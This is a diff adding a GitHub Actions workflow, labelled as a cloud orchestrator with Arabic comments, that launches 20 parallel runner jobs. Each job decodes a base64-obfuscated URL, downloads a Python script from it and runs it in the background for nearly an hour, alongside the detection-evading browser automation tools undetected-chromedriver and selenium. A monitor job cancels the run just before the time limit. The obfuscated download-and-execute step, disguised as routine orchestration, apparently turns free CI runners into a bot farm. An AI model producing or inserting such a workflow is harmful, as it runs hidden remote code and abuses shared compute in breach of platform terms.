@@ -1,0 +1,88 @@
+name: Cloud Execution Orchestrator
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: flow-control-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Workflow Lifecycle Monitor: إلغاء التشغيل تلقائيًا بعد 59 دقيقة
+  # =================================================================
+  lifecycle-monitor:
+    name: "Lifecycle Sentinel"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_EXECUTION_TIME: 3540
+    steps:
+      - name: Initiate Watch Window
+        run: |
+          printf "[MONITOR] Tracking execution session: %s\n" "${{ github.run_id }}"
+          
+          sleep "${MAX_EXECUTION_TIME}"
+
+          printf "[MONITOR] Window limit reached. Terminating session...\n"
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Async Worker Pool: تشغيل المهام الموازية
+  # =================================================================
+  async-worker-pool:
+    name: "Node-Runner-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [NODE-701, NODE-702, NODE-703, NODE-704, NODE-705, NODE-706, NODE-707, NODE-708, NODE-709, NODE-710, NODE-711, NODE-712, NODE-713, NODE-714, NODE-715, NODE-716, NODE-717, NODE-718, NODE-719, NODE-720]
+
+    steps:
+      # -----------------------------------------------------------------
+      # 1. تهيئة حزم التشغيل الأساسية
+      # -----------------------------------------------------------------
+      - name: Install System Utilities
+        run: |
+          sudo apt update -q
+          sudo apt install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # 2. جلب الملف التنفيذي
+      # -----------------------------------------------------------------
+      - name: Download Execution Core
+        run: |
+          RESOURCE_URI=$(awk 'BEGIN { print "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" }' | base64 -d)
+          curl -sL "$RESOURCE_URI" -o worker_exec.py
+
+      # -----------------------------------------------------------------
+      # 3. تثبيت واعتماد المكتبات
+      # -----------------------------------------------------------------
+      - name: Load Dependencies
+        run: |
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # 4. إدارة دورة حياة العملية الخلفية
+      # -----------------------------------------------------------------
+      - name: Launch Background Task
+        run: |
+          python3 worker_exec.py &
+          PROCESS_PID=$!
+
+          sleep 3540
+
+          if kill -0 "$PROCESS_PID" 2>/dev/null; then
+            kill -15 "$PROCESS_PID" 2>/dev/null || kill -9 "$PROCESS_PID"
+          fi
